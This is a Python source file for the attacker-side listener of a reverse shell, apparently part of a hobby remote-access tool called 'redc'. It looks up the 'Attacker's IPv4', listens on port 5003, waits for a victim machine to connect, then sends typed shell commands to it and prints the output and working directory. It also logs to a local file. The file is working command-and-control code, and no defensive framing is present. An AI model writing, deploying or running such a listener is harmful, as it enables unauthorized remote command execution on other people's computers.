import socket
import os
import sys
import time
import logging
import logging.handlers
import linecache
from _logger_ import *

log = logging.getLogger('a8196KL')
log.setLevel(logging.INFO)

formatter = logging.Formatter('[%(levelname)s] (%(filename)s:%(lineno)d) > %(message)s')
fileHandler = logging.FileHandler('./A8196LOG.log')
streamHandler = logging.StreamHandler()

fileHandler.setFormatter(formatter)
streamHandler.setFormatter(formatter)

log.addHandler(fileHandler)
log.addHandler(streamHandler)

redc_logo = open("logo.redc","r+t",encoding="UTF-8")
redc_logo_tx = redc_logo.readline()

redc_settings_Auto = open("Settings.redc","rt+")
redc_settings_Auto_tx = redc_settings_Auto.readlines()
redc_settings_Auto.close()


redc_logging = open('./A8196LOG.log')
time.sleep(1.6)
line_number = 1
line = redc_settings_Auto_tx[line_number - 1]


print("Finding Attacker's IPv4")
if  line == "AutoFindAttackerIPv4=True":
    ipv4 = socket.gethostbyname(socket.gethostname())
    print("IPv4 : "+ipv4)
    SERVER_HOST = ipv4
else:
    print("Failed")
    print(Exception)
    exit()
time.sleep(1.6)


print(redc_logo_tx)
SERVER_PORT = 5003
BUFFER_SIZE = 8196 * 16392 # 134MB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"
# create a socket object
s = socket.socket()

s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print(f"[+] Listening as {SERVER_HOST}:{SERVER_PORT} ...")
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)
while True:
    log_(f"Connected Client! Ipv4 : {SERVER_HOST}:{SERVER_PORT}","./A8196LOG.log")

    # get the command from prompt
    
    command = input(f"{cwd} $> ")
    if not command.strip():
        # empty command
        continue
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # retrieve command results
    output = client_socket.recv(BUFFER_SIZE).decode()
    # split command output and current directory
    results, cwd = output.split(SEPARATOR)
    # print output
    print(results)